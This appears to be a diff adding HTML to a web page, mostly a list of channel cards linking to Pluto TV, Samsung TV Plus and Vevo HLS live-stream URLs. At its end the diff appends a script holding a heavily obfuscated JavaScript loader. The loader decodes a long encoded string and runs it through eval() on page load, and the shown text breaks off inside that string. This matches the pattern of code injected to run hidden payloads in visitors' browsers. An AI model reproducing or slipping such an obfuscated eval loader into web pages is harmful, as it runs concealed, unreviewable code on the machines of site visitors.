+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/6047fabfce6e8e00070bcc9f/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/6047fabfce6e8e00070bcc9f/colorLogoPNG.png	"/> <h6>	MTV Biggest Pop	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/6047fd723b5bd00007de7092/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/6047fd723b5bd00007de7092/colorLogoPNG.png	"/> <h6>	MTV Spankin' New	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/604bdf4e6d0abc0007ba77ad/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/604bdf4e6d0abc0007ba77ad/colorLogoPNG.png	"/> <h6>	Sin Tetas No Hay Paraíso	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/609059dc63be6e0007b4eca6/master.m3u8?deviceId=channel&deviceModel=web&deviceVersion=1.0&appVersion=1.0&deviceType=rokuChannel&deviceMake=rokuChannel&deviceDNT=1&advertisingId=channel&embedPartner=rokuChannel&appName=rokuchannel&is_lat=1&bmodel=bm1&content=channel&platform=web&tags=ROKU_CONTENT_TAGS&coppa=false&content_type=livefeed&rdid=channel&genre=ROKU_ADS_CONTENT_GENRE&content_rating=ROKU_ADS_CONTENT_RATING&studio_id=viacom&channel_id=channel	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/609059dc63be6e0007b4eca6/colorLogoPNG.png	"/> <h6>	Pluto TV Cine Clásico	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5fd87d882574170007fac022/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/08/98/ESBA33000262Z_20210209T093344.png	"/> <h6>	Bob Esponja	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5f8463f3b02eb40007f75f9d/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/03/67/ESBA3300025WZ_20201118T003340.png	"/> <h6>	Los Asesinatos de Midsomer	</h6></a></li>
+<li> <a href="	https://eu.linear.zype.com/0912f967-726e-42e6-9818-68d4af2b3db2/9c1fe80e-9af9-4e57-b48d-aee073c27e70-samsung-tv/live.m3u8?sitesection_id=vevo_linear%3A_samsungtvplus&sitesection_network_id=516283&sitesection_fallback_id=15346233&device_id=%7BPSID%7D&target_option=%7BTARGETOPT%7D&app_name=%7BAPP_NAME%7D&app_domain=%7BAPP_DOMAIN%7D&TC_STRING=%7BTC_STRING%7D	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/01/31/ESBA39000026L_20211013T011752.png	"/> <h6>	Vevo Latino	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5f5a0a0109d930000711e610/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/01/54/ESAJ3800005C5_20210428T113604.png	"/> <h6>	Comedia Made in Spain	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5f59f5b7cc331900075e7767/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/01/97/ESAJ380000226_20201029T004343.png	"/> <h6>	MTV Originals	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5f59f661f68f9200078870d4/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/01/91/ESAJ3800003LX_20210414T025436.png	"/> <h6>	MTV Catfish	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5f5a0a5ea82f7200075cb926/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/01/93/ESAJ3800006TT_20210414T024016.png	"/> <h6>	MTV Cribs	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5f5a0b44cc331900075e7769/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/01/15/ESAJ3800008ZD_20201118T003337.png	"/> <h6>	Pluto TV Mundo Real	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/604125ef4b0285000720271e/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/03/88/ESBA3300027H5_20210512T003426.png	"/> <h6>	Las Reglas Del Juego	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5f5a09b16cd4ab0007d24fb8/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&ads.coppa=1&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/03/62/ESAJ38000046O_20201029T004405.png	"/> <h6>	Pluto TV Kids	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5f5a2aea6bffc400076bb4e5/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/01/48/ESAJ3800009VJ_20201029T004411.png	"/> <h6>	Pluto TV Animakids	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5f5a0af1f26bc900079ab871/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/02/93/ESAJ3800007PC_20210401T071459.png	"/> <h6>	Pluto TV Cocina	</h6></a></li>
+<li> <a href="	http://service-stitcher-ipv4.clusters.pluto.tv/v1/stitch/embed/hls/channel/5f59f50cc36a94000749fd3f/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=%7BUS_PRIVACY%7D&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&embedPartner=samsung-tvplus&gdprConsent=%7BTC_STRING%7D&gdpr=1	 " target="_blank"  class="card"> <img src="	https://tvpmlogopeu.samsungcloud.tv/platform/image/sourcelogo/vc/70/02/02/ESAJ3800001KT_20210209T093445.png	"/> <h6>	Pluto TV Cine Estelar	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5f1abce155a03d0007718834/master.m3u8?advertisingId=&appName=web&appStoreUrl=&appVersion=DNT&app_name=&architecture=&buildVersion=&deviceDNT=0&deviceId=5f1abce155a03d0007718834&deviceLat=41.1167&deviceLon=1.2500&deviceMake=web&deviceModel=web&deviceType=web&deviceVersion=DNT&includeExtendedEvents=false&marketingRegion=ES&serverSideAds=false&sid=505&terminate=false&userId=	 " target="_blank"  class="card"> <img src="	https://image.shutterstock.com/image-vector/product-made-spain-illustration-260nw-1294741963.jpg	"/> <h6>	COMEDIA MADE IN SPAIN	</h6></a></li>
+<li> <a href="	https://stitcher-ipv4.pluto.tv/stitch/hls/channel/5cf96cc422df39f1a338d165/master.m3u8?deviceId=0&deviceVersion=0&appVersion=0&deviceType=0&deviceMake=0&sid=293d&deviceDNT=0&deviceModel=0&already_redirected=true	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/Telemundo_logo_2018.svg/284px-Telemundo_logo_2018.svg.png	"/> <h6>	TELEMUNDO NOVELAS	</h6></a></li>
+<li> <a href="	http://stitcher-ipv4.pluto.tv/v1/stitch/embed/hls/channel/6140a074a99e79000738162a/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=1YNY&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&profileLimit=&profileFloor=&embedPartner=samsung-tvplus	 " target="_blank"  class="card"> <img src="	http://www.logo-designer.co/wp-content/uploads/2020/03/2020-Pluto-TV-logo-design.png	"/> <h6>	PLUTO FITNESS	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/stitch/hls/channel/6076cd1df8576d0007c82193/master.m3u8?advertisingId=&appName=web&appVersion=5.16.0-d477896b413cece569cca008ddae951d02cadc9e&app_name=web&clientDeviceType=0&clientID=65dca7cb-5c3a-4186-9083-f702118added&clientModelNumber=na&deviceDNT=false&deviceId=65dca7cb-5c3a-4186-9083-f702118added&deviceLat=40.4229&deviceLon=-3.6916&deviceMake=Chrome%2BMobile&deviceModel=web&deviceType=web&deviceVersion=83.0.4103.106&marketingRegion=ES&serverSideAds=true&sessionID=2461f85b-af74-11eb-8ea1-0242ac110002&sid=2461f85b-af74-11eb-8ea1-0242ac110002&userId=	 " target="_blank"  class="card"> <img src="	https://upload.wikimedia.org/wikipedia/commons/thumb/5/58/VH1_Classic_UK.svg/320px-VH1_Classic_UK.svg.png	"/> <h6>	VHI CLASSIC	</h6></a></li>
+<li> <a href="	https://stitcher.pluto.tv/stitch/hls/channel/5f68f53eb1e5800007390bf8/master.m3u8?deviceType=web&servertSideAds=false&deviceMake=safari&deviceVersion=1&deviceId=spencer&appVersion=1&deviceDNT=0&deviceModel=web&sid=943ba0c1-974b-11ec-a4c1-0242ac110003	 " target="_blank"  class="card"> <img src="	https://graph.facebook.com/CMTMusicChannel/picture?width=200&height=200	"/> <h6>	CMT MUSIC	</h6></a></li>
+<li> <a href="	http://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5f32f26bcd8aea00071240e5/master.m3u8?advertisingId=&appName=web&appVersion=unknown&appStoreUrl=&architecture=&buildVersion=&clientTime=0&deviceDNT=0&deviceId=1c868321-7089-11eb-842e-ed7bad763363&deviceMake=Chrome&deviceModel=web&deviceType=web&deviceVersion=unknown&includeExtendedEvents=false&sid=1d158533-4c2c-4f85-8afd-5c0cbcdcb90a&userId=&serverSideAds=true	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5f32f26bcd8aea00071240e5/colorLogoPNG.png	"/> <h6>	VEVO 70's	</h6></a></li>
+<li> <a href="	http://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5fd7b8bf927e090007685853/master.m3u8?advertisingId=&appName=web&appVersion=unknown&appStoreUrl=&architecture=&buildVersion=&clientTime=0&deviceDNT=0&deviceId=1c8aa1d1-7089-11eb-842e-ed7bad763363&deviceMake=Chrome&deviceModel=web&deviceType=web&deviceVersion=unknown&includeExtendedEvents=false&sid=43501a2e-2968-4f0a-9974-5f5683f1f0db&userId=&serverSideAds=true	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5fd7b8bf927e090007685853/colorLogoPNG.png	"/> <h6>	VEVO 80'S	</h6></a></li>
+<li> <a href="	http://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5fd7bb1f86d94a000796e2c2/master.m3u8?advertisingId=&appName=web&appVersion=unknown&appStoreUrl=&architecture=&buildVersion=&clientTime=0&deviceDNT=0&deviceId=1c8aa1d2-7089-11eb-842e-ed7bad763363&deviceMake=Chrome&deviceModel=web&deviceType=web&deviceVersion=unknown&includeExtendedEvents=false&sid=350f636b-2a16-48a8-9dfd-208857d4c1a7&userId=&serverSideAds=true	 " target="_blank"  class="card"> <img src="	https://cigars.roku.com/v1/contain/290x218/https%3A%2F%2Fimage.roku.com%2Fdeveloper_channels%2Fprod%2F3dc5aedf9d7694c220fc28f1a5180c812d9831ca2326a9970c65044e7bbcbd97.png	"/> <h6>	VEVO 90's	</h6></a></li>
+<li> <a href="	http://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5d93b635b43dd1a399b39eee/master.m3u8?advertisingId=&appName=web&appVersion=unknown&appStoreUrl=&architecture=&buildVersion=&clientTime=0&deviceDNT=0&deviceId=1c8068a2-7089-11eb-842e-ed7bad763363&deviceMake=Chrome&deviceModel=web&deviceType=web&deviceVersion=unknown&includeExtendedEvents=false&sid=f01ebfed-7ad5-4d03-b1ca-023870fcb436&userId=&serverSideAds=true	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/5d93b635b43dd1a399b39eee/colorLogoPNG.png	"/> <h6>	VEVO POP	</h6></a></li>
+<li> <a href="	https://service-stitcher.clusters.pluto.tv/v1/stitch/embed/hls/channel/5da0d75e84830900098a1ea0/master.m3u8?advertisingId=channel&appName=rokuchannel&appVersion=1.0&bmodel=bm1&channel_id=channel&content=channel&content_rating=ROKU_ADS_CONTENT_RATING&content_type=livefeed&coppa=false&deviceDNT=1&deviceId=channel&deviceMake=rokuChannel&deviceModel=web&deviceType=rokuChannel&deviceVersion=1.0&embedPartner=rokuChannel&genre=ROKU_ADS_CONTENT_GENRE&is_lat=1&platform=web&rdid=channel&studio_id=viacom&tags=ROKU_CONTENT_TAGS	 " target="_blank"  class="card"> <img src="	https://e7.pngegg.com/pngimages/862/837/png-clipart-logo-vevo-advertising-business-music-business-text-trademark-thumbnail.png	"/> <h6>	VEVO COUNTRY	</h6></a></li>
+<li> <a href="	http://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5fd7bca3e0a4ee0007a38e8c/master.m3u8?advertisingId=&appName=web&appVersion=unknown&appStoreUrl=&architecture=&buildVersion=&clientTime=0&deviceDNT=0&deviceId=1c8b6520-7089-11eb-842e-ed7bad763363&deviceMake=Chrome&deviceModel=web&deviceType=web&deviceVersion=unknown&includeExtendedEvents=false&sid=085b69d0-8c20-45f3-b57d-7845972596d9&userId=&serverSideAds=true	 " target="_blank"  class="card"> <img src="	https://e7.pngegg.com/pngimages/862/837/png-clipart-logo-vevo-advertising-business-music-business-text-trademark-thumbnail.png	"/> <h6>	VEVO 2K	</h6></a></li>
+<li> <a href="	http://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5f32f397795b750007706448/master.m3u8?advertisingId=&appName=web&appVersion=unknown&appStoreUrl=&architecture=&buildVersion=&clientTime=0&deviceDNT=0&deviceId=1c868322-7089-11eb-842e-ed7bad763363&deviceMake=Chrome&deviceModel=web&deviceType=web&deviceVersion=unknown&includeExtendedEvents=false&sid=fc027a03-e512-45db-98af-879f6889407f&userId=&serverSideAds=true	 " target="_blank"  class="card"> <img src="	https://e7.pngegg.com/pngimages/862/837/png-clipart-logo-vevo-advertising-business-music-business-text-trademark-thumbnail.png	"/> <h6>	VEVO TRAP REGGAETON	</h6></a></li>
+<li> <a href="	http://service-stitcher.clusters.pluto.tv/stitch/hls/channel/5da0d83f66c9700009b96d0e/master.m3u8?advertisingId=&appName=web&appVersion=unknown&appStoreUrl=&architecture=&buildVersion=&clientTime=0&deviceDNT=0&deviceId=1c80b6c0-7089-11eb-842e-ed7bad763363&deviceMake=Chrome&deviceModel=web&deviceType=web&deviceVersion=unknown&includeExtendedEvents=false&sid=6bc0815e-fe9a-464b-9d20-af824e8dcdc5&userId=&serverSideAds=true	 " target="_blank"  class="card"> <img src="	https://e7.pngegg.com/pngimages/862/837/png-clipart-logo-vevo-advertising-business-music-business-text-trademark-thumbnail.png	"/> <h6>	VEVO RnB	</h6></a></li>
+<li> <a href="	http://stitcher-ipv4.pluto.tv/v1/stitch/embed/hls/channel/62d816fcf24d280008762ee9/master.m3u8?deviceType=samsung-tvplus&deviceMake=samsung&deviceModel=samsung&deviceVersion=unknown&appVersion=unknown&deviceLat=0&deviceLon=0&deviceDNT=%7BTARGETOPT%7D&deviceId=%7BPSID%7D&advertisingId=%7BPSID%7D&us_privacy=1YNY&samsung_app_domain=%7BAPP_DOMAIN%7D&samsung_app_name=%7BAPP_NAME%7D&profileLimit=&profileFloor=&embedPartner=samsung-tvplus	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/62d816fcf24d280008762ee9/colorLogoPNG.png	"/> <h6>	La Liga Premier | Paramount+	</h6></a></li>
+<li> <a href="	https://siloh.pluto.tv/lilo/production/BEIN/ES/master_1.m3u8	 " target="_blank"  class="card"> <img src="	https://images.pluto.tv/channels/60492fdd9989d30007ccd30a/colorLogoPNG.png	"/> <h6>	beIN SPORTS XTRA en español	</h6></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+
+
+
+              <!-- 
+
+
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+
+
+
+
+
+
+               -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+
+</ul></center><br>
+<script>
+var _0xc32e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe53c(d,e,f){var g=_0xc32e[2][_0xc32e[1]](_0xc32e[0]);var h=g[_0xc32e[3]](0,e);var i=g[_0xc32e[3]](0,f);var j=d[_0xc32e[1]](_0xc32e[0])[_0xc32e[10]]()[_0xc32e[9]](function(a,b,c){if(h[_0xc32e[4]](b)!==-1)return a+=h[_0xc32e[4]](b)*(Math[_0xc32e[8]](e,c))},0);var k=_0xc32e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc32e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe53c(s,e,10)-t)}return decodeURIComponent(escape(r))}("RLRvRMCvRqLvBRBvRBqvBLLvRLLvRMMvBLLvRMqvMMCvRBCvBRRvBRRvBLBvBRRvRLCvRqRvRRLvRRMvRLBvBRRvBLBvBRRvBLLvMCCvMCBvMCMvMCRvMCqvMCLvMBCvMBBvMBMvRMCvRMBvRMMvRMRvRMqvRMLvRRCvRRBvRRMvRRRvRRqvRRLvRqCvRqBvRqMvRqRvRqqvRqLvRLCvRLBvRLMvRLRvRLqvRLLvqCCvqCBvMMqvMMLvMRCvMRBvMRMvMRRvMRqvMRLvMqCvMqBvMqMvMqRvMqqvMqLvMLCvMLBvMLMvMLRvMLqvMLLvRCCvRCBvRCMvRCRvRCqvRCLvBLCvBLqvBRRvBLBvBRRvRLCvRRLvRRMvRMMvRMqvBRRvBLBvBRRvRRMvRqBvRMRvRMqvRLLvMLCvRMLvBRRvBLBvBRRvBRRvBLBvBRRvBRRvBLBvBRRvBLRvBRRvBLBvBRRvRqRvRqMvRLqvBRRvBLBvBRRvRqLvRMqvRMRvRLMvRMMvRMqvBRRvBLBvBRRvRqLvRMqvRLRvRMqvRqLvRLCvRMqvBRRvBLBvBRRvBLLvBRRvRBMvMBqvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBRBvRBqvBLLvRLLvRMqvMCMvRMMvBqRvRMRvBLBvRMqvBLBvRMLvBqqvqCMvRLRvRMCvRqLvBRBvRRCvMMCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCBvRBMvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvRBMvRBMvBqRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvBqqvMBqvRLRvRMCvRqLvBRBvRRBvMMCvRRCvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCMvRBMvRBMvBqRvBLLvBLBvRMqvBqqvMBqvRLRvRMCvRqLvBRBvRRMvMMCvRRCvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCMvRBMvRBMvBqRvBLLvBLBvRMLvBqqvMBqvRLRvRMCvRqLvBRBvRRRvMMCvRMRvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvRBMvRBMvBqRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvBqqvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvBLLvRBMvRBMvBqRvBqqvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMBMvRBMvRBMvBqRvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBqRvRMCvBLBvRMBvBLBvRMMvBqqvqCMvRRMvRMLvBqRvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCRvRBMvRBMvBqRvRMBvBqqvBRMvMMCvMMCvBLMvMCCvBqqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRMCvBLCvMMCvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCRvRBMvRBMvBqRvRMBvBqqvBqLvBqRvMqqvRMCvRLBvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMBBvRBMvRBMvBqRvRMqvBLBvRMMvBqqvBqqvqCqvBLBvBLLvBqqvMBqvRLRvRMCvRqLvBRBvRRqvMMCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvMBqvRLqvRRBvRRMvRRLvRMqvBqRvRRRvMMBvBL